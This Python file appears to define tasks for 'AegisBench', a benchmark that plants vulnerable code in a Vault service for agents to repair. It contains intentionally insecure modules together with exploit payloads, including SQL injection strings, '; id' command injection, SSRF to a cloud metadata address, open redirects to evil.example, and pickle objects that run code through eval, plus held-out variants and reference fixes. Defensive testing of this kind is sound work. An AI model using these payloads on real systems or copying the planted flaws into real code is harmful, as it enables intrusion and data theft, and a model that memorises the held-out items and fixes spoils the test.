"""AegisBench task definitions.

Each task plants one exploitable bug in one helper module of the Vault service
(aegisbench/service). The route that is attacked lives in vault/routes/, but the
bug is in vault/core/, so an agent has to follow calls to find it.

For every task:
  target      the file whose contents are replaced by the vulnerable variant
  route       the attacked HTTP route
  exploit     query parameters of the real exploit (seen in "production")
  visible     red-team variants the agent's verification gate may use
  heldout     variants never shown to the agent; used only to score generalisation
  benign      legitimate requests whose answers must not change
"""
from __future__ import annotations

import base64
import pickle

UP = "../" * 8


class _Canary:
    def __reduce__(self):
        return (eval, ("'AEGIS-CANARY-RCE-EXECUTED'",))


class _Id:
    def __reduce__(self):
        return (eval, ("__import__('subprocess').check_output(['id']).decode()",))


PICKLE_RCE = base64.b64encode(pickle.dumps(_Canary())).decode()
PICKLE_ID = base64.b64encode(pickle.dumps(_Id())).decode()
PICKLE_OK = base64.b64encode(pickle.dumps({"theme": "dark", "lang": "en"})).decode()
PICKLE_OK2 = base64.b64encode(pickle.dumps({"theme": "light", "tz": "IST", "beta": True})).decode()

V = {}  # vulnerable file contents, keyed by task id

V["pt-docs"] = '''"""Document storage on local disk."""
import os

from vault.core.config import DOCS_DIR


def read_blob(name: str) -> str:
    path = os.path.join(DOCS_DIR, name)
    if not os.path.isfile(path):
        raise FileNotFoundError(name)
    with open(path, "r", errors="ignore") as handle:
        return handle.read()
'''

V["pt-templates"] = '''"""Report templates."""
import os

from vault.core.config import TEMPLATES_DIR


def load_template(name: str) -> str:
    path = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isfile(path):
        raise FileNotFoundError(name)
    with open(path) as handle:
        return handle.read()


def render(name: str, title: str) -> str:
    return load_template(name).replace("{{title}}", title)
'''

_DB_HEAD = '''"""Customer and notes database (SQLite)."""
import sqlite3

from vault.core.config import DB_PATH


def connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn
'''
_DB_SAFE_CUSTOMER = '''

def find_customer(tenant: str, email: str) -> list[dict]:
    with connect() as conn:
        rows = conn.execute("SELECT id, tenant_id, full_name, email FROM customers WHERE tenant_id = ? AND email = ?",
                            (tenant, email)).fetchall()
    return [dict(r) for r in rows]
'''
_DB_SAFE_NOTES = '''

def search_notes(tenant: str, query: str) -> list[dict]:
    with connect() as conn:
        rows = conn.execute("SELECT id, tenant_id, body FROM notes WHERE tenant_id = ? AND body LIKE ?",
                            (tenant, f"%{query}%")).fetchall()
    return [dict(r) for r in rows]
'''
_DB_TAIL = '''

def get_invoice(invoice_id: str) -> dict | None:
    with connect() as conn:
        row = conn.execute("SELECT id, tenant_id, amount, status FROM invoices WHERE id = ?", (invoice_id,)).fetchone()
    return dict(row) if row else None


def get_file(file_id: str) -> dict | None:
    with connect() as conn:
        row = conn.execute("SELECT id, tenant_id, name, body FROM files WHERE id = ?", (file_id,)).fetchone()
    return dict(row) if row else None
'''
V["sqli-customers"] = _DB_HEAD + '''

def find_customer(tenant: str, email: str) -> list[dict]:
    query = f"SELECT id, tenant_id, full_name, email FROM customers WHERE tenant_id = '{tenant}' AND email = '{email}'"
    with connect() as conn:
        rows = conn.execute(query).fetchall()
    return [dict(r) for r in rows]
''' + _DB_SAFE_NOTES + _DB_TAIL
V["sqli-notes"] = _DB_HEAD + _DB_SAFE_CUSTOMER + '''

def search_notes(tenant: str, query: str) -> list[dict]:
    sql = f"SELECT id, tenant_id, body FROM notes WHERE tenant_id = '{tenant}' AND body LIKE '%{query}%'"
    with connect() as conn:
        rows = conn.execute(sql).fetchall()
    return [dict(r) for r in rows]
''' + _DB_TAIL

V["redos-email"] = '''"""Input validation."""
import re

EMAIL = re.compile(r"^([a-zA-Z0-9]+\\.?)+@([a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}$")
SLUG = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")


def is_email(value: str) -> bool:
    return bool(EMAIL.match(value))


def is_slug(value: str) -> bool:
    return len(value) <= 64 and bool(SLUG.match(value))
'''
V["redos-slug"] = '''"""Input validation."""
import re

EMAIL = re.compile(r"^[a-zA-Z0-9]+(?:\\.[a-zA-Z0-9]+)*@[a-zA-Z0-9-]+(?:\\.[a-zA-Z0-9-]+)*\\.[a-zA-Z]{2,}$")
SLUG = re.compile(r"^([a-z0-9]+-?)+$")


def is_email(value: str) -> bool:
    return len(value) <= 254 and bool(EMAIL.match(value))


def is_slug(value: str) -> bool:
    return bool(SLUG.match(value))
'''

V["cmdi-status"] = '''"""Operational helpers that call system tools."""
import subprocess


def echo_status(host: str) -> str:
    result = subprocess.run(f"echo checking {host}", shell=True, capture_output=True, text=True, timeout=5)
    return result.stdout.strip()
'''
V["cmdi-archive"] = '''"""Archive listings."""
import subprocess

from vault.core.config import ARCHIVE_DIR


def list_archive(name: str) -> list[str]:
    result = subprocess.run(f"ls {ARCHIVE_DIR}/{name}", shell=True, capture_output=True, text=True, timeout=5)
    if result.returncode != 0:
        raise FileNotFoundError(name)
    return sorted(line for line in result.stdout.splitlines() if line)
'''

V["ssrf-preview"] = '''"""Link previews for documents."""
from urllib.parse import urlparse

from vault.core.config import ALLOWED_FETCH_HOSTS
from vault.core.net import http_get


def preview(url: str) -> str:
    parts = urlparse(url)
    return http_get(parts.hostname or "", parts.path or "/")[:200]


def read_asset(url: str) -> str:
    parts = urlparse(url)
    if parts.scheme != "https" or parts.hostname not in ALLOWED_FETCH_HOSTS:
        raise PermissionError("scheme or host not allowed")
    return http_get(parts.hostname, parts.path or "/")[:200]
'''
V["ssrf-asset"] = '''"""Link previews for documents."""
from urllib.parse import urlparse

from vault.core.config import ALLOWED_FETCH_HOSTS
from vault.core.net import http_get


def preview(url: str) -> str:
    parts = urlparse(url)
    if parts.scheme != "https" or parts.hostname not in ALLOWED_FETCH_HOSTS:
        raise PermissionError("host not allowed")
    return http_get(parts.hostname, parts.path or "/")[:200]


def read_asset(url: str) -> str:
    parts = urlparse(url)
    if parts.scheme == "file":
        with open(parts.path, errors="ignore") as handle:
            return handle.read()[:4000]
    if parts.hostname not in ALLOWED_FETCH_HOSTS:
        raise PermissionError("host not allowed")
    return http_get(parts.hostname, parts.path or "/")[:200]
'''

V["redirect-login"] = '''"""Post-login redirects."""
from urllib.parse import urlparse

from vault.core.config import ALLOWED_REDIRECT_HOSTS


def safe_next(target: str) -> str:
    return target or "/home"


def logout_target(target: str) -> str:
    parts = urlparse(target)
    if parts.scheme == "" and parts.netloc == "" and target.startswith("/") and not target.startswith("//"):
        return target
    if parts.scheme == "https" and parts.hostname in ALLOWED_REDIRECT_HOSTS:
        return target
    return "/home"
'''
V["redirect-logout"] = '''"""Post-login redirects."""
from urllib.parse import urlparse

from vault.core.config import ALLOWED_REDIRECT_HOSTS


def safe_next(target: str) -> str:
    parts = urlparse(target)
    if parts.scheme == "" and parts.netloc == "" and target.startswith("/") and not target.startswith("//"):
        return target
    if parts.scheme == "https" and parts.hostname in ALLOWED_REDIRECT_HOSTS:
        return target
    return "/home"


def logout_target(target: str) -> str:
    if target.startswith("/"):
        return target
    return "/home"
'''

V["idor-invoice"] = '''"""Invoice views."""
from vault.core import db
from vault.core.tenancy import require_same_tenant


def invoice_for(tenant: str, invoice_id: str) -> dict:
    record = db.get_invoice(invoice_id)
    if record is None:
        raise FileNotFoundError(invoice_id)
    return record
'''
V["idor-files"] = '''"""Tenant file downloads."""
from vault.core import db
from vault.core.tenancy import require_same_tenant


def download(tenant: str, file_id: str) -> dict:
    record = db.get_file(file_id)
    if record is None:
        raise FileNotFoundError(file_id)
    return {"id": record["id"], "tenant_id": record["tenant_id"], "name": record["name"], "body": record["body"]}
'''

V["deser-prefs"] = '''"""User preference blobs (base64-encoded pickles from the legacy client)."""
import base64
import pickle


def load_prefs(blob: str) -> dict:
    data = pickle.loads(base64.b64decode(blob))
    if not isinstance(data, dict):
        return {"value": str(data)}
    return data
'''
V["fmt-greet"] = '''"""Greeting banners."""
from vault.core import config


class User:
    def __init__(self, name: str):
        self.name = name


def banner(template: str, name: str) -> str:
    return template.format(user=User(name))
'''


def T(tid, cls, cwe, target, route, param, exploit, visible, heldout, benign, fixed=None):
    fixed = fixed or {}
    mk = lambda vals: [{**fixed, param: v} for v in vals]
    return {"id": tid, "class": cls, "cwe": cwe, "target": target, "route": route, "param": param,
            "exploit": {**fixed, param: exploit}, "visible": mk(visible), "heldout": mk(heldout),
            "benign": benign, "vulnerable": V[tid]}


TASKS = [
    T("pt-docs", "path_traversal", "CWE-22", "vault/core/storage.py", "/api/v1/docs/read", "name",
      UP + "etc/passwd",
      ["../.env", "..%2f..%2f.env", "/etc/passwd", "....//....//etc/passwd"],
      [UP + "etc/hosts", "..\\..\\.env", "docs/../../.env", "../../" + "etc/passwd"],
      [{"name": "handbook.txt"}, {"name": "q3.txt"}]),
    T("pt-templates", "path_traversal", "CWE-22", "vault/core/templates.py", "/api/v1/reports/render", "template",
      "../.env",
      [UP + "etc/passwd", "/etc/passwd", "../../" + ".env"],
      ["../docs/../.env", UP + "etc/hosts", "./../.env"],
      [{"template": "invoice.tpl", "title": "Q3"}, {"template": "summary.tpl", "title": "Year"}]),
    T("sqli-customers", "sql_injection", "CWE-89", "vault/core/db.py", "/api/v1/customers/lookup", "email",
      "x' OR '1'='1",
      ["x' OR 1=1 --", "x' UNION SELECT id, tenant_id, full_name, email FROM customers --", "X' OR 'A'='A"],
      ["' OR ''='", "x'/**/OR/**/1=1--", "nobody' OR tenant_id LIKE '%"],
      [{"tenant": "tenant-a", "email": "asha@a.example"}, {"tenant": "tenant-b", "email": "cara@b.example"},
       {"tenant": "tenant-a", "email": "nobody@a.example"}], fixed={"tenant": "tenant-a"}),
    T("sqli-notes", "sql_injection", "CWE-89", "vault/core/db.py", "/api/v1/notes/search", "q",
      "x%' OR '1'='1' --",
      ["%' OR 1=1 --", "' UNION SELECT id, tenant_id, body FROM notes --", "X%' OR 'A'='A"],
      ["a%' OR tenant_id<>'", "%'/**/OR/**/1=1--", "' OR body LIKE '%"],
      [{"tenant": "tenant-a", "q": "report"}, {"tenant": "tenant-a", "q": "renewal"}, {"tenant": "tenant-b", "q": "board"}],
      fixed={"tenant": "tenant-a"}),
    T("redos-email", "redos", "CWE-1333", "vault/core/validate.py", "/api/v1/validate/email", "value",
      "a" * 28 + "!",
      ["b" * 28 + "!", "ab" * 14 + "!", "a" * 34 + "@"],
      ["z9" * 15 + "#", "q" * 30 + "@x", "a1" * 16 + "@-"],
      [{"value": "asha@a.example"}, {"value": "lead.architect@defense.example.com"}, {"value": "not-an-email"}]),
    T("redos-slug", "redos", "CWE-1333", "vault/core/validate.py", "/api/v1/validate/slug", "value",
      "a" * 28 + "!",
      ["b" * 28 + "!", "ab" * 14 + "_", "z" * 34 + "A"],
      ["x9" * 15 + "!", "q" * 31 + "?", "m" * 29 + "."],
      [{"value": "q3-report"}, {"value": "annual-board-summary"}, {"value": "Not A Slug"}]),
    T("cmdi-status", "command_injection", "CWE-78", "vault/core/shell.py", "/api/v1/ops/status", "host",
      "vault.example; id",
      ["x && id", "x | id", "$(id)", "`id`"],
      ["x;id", "x\nid", "x || id"],
      [{"host": "vault.example"}, {"host": "db-1.internal"}]),
    T("cmdi-archive", "command_injection", "CWE-78", "vault/core/archive.py", "/api/v1/ops/archive", "name",
      "q3; id",
      ["q3 && id", "q3 | id", "$(id)"],
      ["q3;id", "q4`id`", "q3 || id"],
      [{"name": "q3"}, {"name": "q4"}]),
    T("ssrf-preview", "ssrf", "CWE-918", "vault/core/fetch.py", "/api/v1/preview", "url",
      "http://169.254.169.254/latest/meta-data/iam",
      ["http://localhost/admin", "https://169.254.169.254/latest/meta-data/iam", "HTTP://LOCALHOST/admin"],
      ["//169.254.169.254/latest/meta-data/iam", "http://localhost:80/admin", "https://localhost/admin"],
      [{"url": "https://docs.vault.example/welcome"}, {"url": "https://cdn.vault.example/logo.txt"}]),
    T("ssrf-asset", "ssrf", "CWE-918", "vault/core/fetch.py", "/api/v1/assets", "url",
      "file:///etc/passwd",
      ["file:///etc/hosts", "FILE:///etc/passwd", "http://169.254.169.254/latest/meta-data/iam"],
      ["file://localhost/etc/passwd", "file:/etc/passwd", "http://localhost/admin"],
      [{"url": "https://cdn.vault.example/logo.txt"}, {"url": "https://docs.vault.example/welcome"}]),
    T("redirect-login", "open_redirect", "CWE-601", "vault/core/redirect.py", "/api/v1/auth/login-redirect", "next",
      "https://evil.example/phish",
      ["//evil.example", "http://evil.example", "https://vault.example.evil.example/"],
      ["/\\evil.example", "https:evil.example", "HTTPS://EVIL.EXAMPLE"],
      [{"next": "/dashboard"}, {"next": "https://app.vault.example/settings"}, {"next": "/home"}]),
    T("redirect-logout", "open_redirect", "CWE-601", "vault/core/redirect.py", "/api/v1/auth/logout", "next",
      "//evil.example/phish",
      ["/\\evil.example", "//evil.example", "///evil.example"],
      ["/\\/evil.example", "//EVIL.EXAMPLE", "/\t/evil.example"],
      [{"next": "/dashboard"}, {"next": "/home"}]),
    T("idor-invoice", "idor", "CWE-639", "vault/core/billing.py", "/api/v1/invoices/get", "id",
      "inv-2001",
      ["INV-2001".lower(), "inv-2001 ", "inv-2001"],
      ["inv-2001", "inv-2001"],
      [{"tenant": "tenant-a", "id": "inv-1001"}, {"tenant": "tenant-a", "id": "inv-1002"}, {"tenant": "tenant-b", "id": "inv-2001"}],
      fixed={"tenant": "tenant-a"}),
    T("idor-files", "idor", "CWE-639", "vault/core/files.py", "/api/v1/files/download", "id",
      "f-2",
      ["f-2", "f-2"],
      ["f-2"],
      [{"tenant": "tenant-a", "id": "f-1"}, {"tenant": "tenant-b", "id": "f-2"}],
      fixed={"tenant": "tenant-a"}),
    T("deser-prefs", "unsafe_deserialization", "CWE-502", "vault/core/prefs.py", "/api/v1/prefs/load", "blob",
      PICKLE_RCE,
      [PICKLE_ID],
      [base64.b64encode(pickle.dumps(_Canary(), protocol=2)).decode()],
      [{"blob": PICKLE_OK}, {"blob": PICKLE_OK2}]),
    T("fmt-greet", "format_string_injection", "CWE-134", "vault/core/greet.py", "/api/v1/greet", "template",
      "{user.__init__.__globals__[config].SECRET_KEY}",
      ["{user.__class__.__init__.__globals__[config].SECRET_KEY}", "{user.__init__.__globals__}"],
      ["{0.__init__.__globals__[config].SECRET_KEY}", "{user.__dict__}{user.__init__.__globals__[config].DB_PATH}"],
      [{"template": "Hello {user.name}!", "name": "Asha"}, {"template": "Welcome back, {user.name}.", "name": "Ben"}],
      fixed={"name": "Asha"}),
]

# The tenant-isolation routes: the attack is "tenant-a asks for tenant-b's record".
for t in TASKS:
    if t["class"] == "idor":
        t["visible"] = [v for i, v in enumerate(t["visible"]) if i == 0] + [{"tenant": "tenant-c", t["param"]: t["exploit"][t["param"]]}]
        t["heldout"] = [{"tenant": "tenant-b2", t["param"]: t["exploit"][t["param"]]}]

BY_ID = {t["id"]: t for t in TASKS}

# Reference fixes, used only to prove each task is solvable (never shown to models).
REFERENCE = {
    "deser-prefs": '''"""User preference blobs (base64-encoded pickles from the legacy client)."""
import base64
import io
import pickle

_ALLOWED = {("builtins", "dict"), ("builtins", "list"), ("builtins", "str"), ("builtins", "int"),
            ("builtins", "float"), ("builtins", "bool")}


class _Restricted(pickle.Unpickler):
    def find_class(self, module, name):
        if (module, name) not in _ALLOWED:
            raise pickle.UnpicklingError(f"forbidden global {module}.{name}")
        return super().find_class(module, name)


def load_prefs(blob: str) -> dict:
    try:
        data = _Restricted(io.BytesIO(base64.b64decode(blob))).load()
    except pickle.UnpicklingError as exc:
        raise ValueError(str(exc))
    if not isinstance(data, dict):
        return {"value": str(data)}
    return data
''',
    "fmt-greet": '''"""Greeting banners."""
import string

from vault.core import config


class User:
    def __init__(self, name: str):
        self.name = name


class _SafeFormatter(string.Formatter):
    def get_field(self, field_name, args, kwargs):
        if field_name != "user.name":
            raise ValueError(f"field not allowed: {field_name}")
        return kwargs["user"].name, field_name


def banner(template: str, name: str) -> str:
    return _SafeFormatter().format(template, user=User(name))
''',
}


def reference_fix(task: dict) -> str:
    from pathlib import Path
    if task["id"] in REFERENCE:
        return REFERENCE[task["id"]]
    return (Path(__file__).resolve().parent / "service" / task["target"]).read_text()
